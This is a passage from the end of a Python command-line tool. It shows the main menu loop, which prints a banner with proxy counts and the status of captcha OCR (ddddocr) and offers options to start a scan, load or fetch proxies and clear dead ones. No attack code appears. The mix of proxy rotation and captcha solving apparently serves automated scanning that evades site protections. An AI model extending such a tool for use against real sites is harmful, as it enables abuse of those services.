        try: input(BCYN + "\n  Press ENTER to return to menu..." + RST)
        except (KeyboardInterrupt, EOFError): pass

def main():
    pm = get_proxy_manager()
    total, active = pm.stats()
    clear_screen()
    print(double_hr(BMAG))
    print_king_logo()
    print(double_hr(BMAG))
    print(f"     {DIM}[INIT] Owner   : {BWHT}{OWNER_NAME}{RST}")
    print(f"     {DIM}[INIT] Proxies : {BWHT}{total} endpoints ({active} active){RST}")
    print(f"     {DIM}[INIT] OCR     : {BWHT}{'ON' if _HAS_OCR else 'OFF (no ddddocr)'}{RST}")
    print(double_hr(BMAG))
    time.sleep(1.0)
    while True:
        try:
            print_menu()
            choice = input(f"  {BCYN}➤ Select:{RST} ").strip()
        except (KeyboardInterrupt, EOFError): choice = '0'
        if choice in ('1', '01'): start_scan_flow()
        elif choice in ('2', '02'): handle_proxy_input()
        elif choice in ('3', '03'): do_mega_fetch()
        elif choice in ('4', '04'): do_clear_dead()
        elif choice in ('0', '00'):
            clear_screen()
            print(double_hr(BMAG))
            print_king_logo()
            print(double_hr(BMAG))
            print(f"     {BMAG}👋 {BWHT}Goodbye, {BYLW}{OWNER_NAME}{RST}")
            print(double_hr(BMAG))
            break
        else:
            print(BRED + "\n  ❌ Invalid option." + RST)
            time.sleep(0.7)

if __name__ == '__main__':
    main()
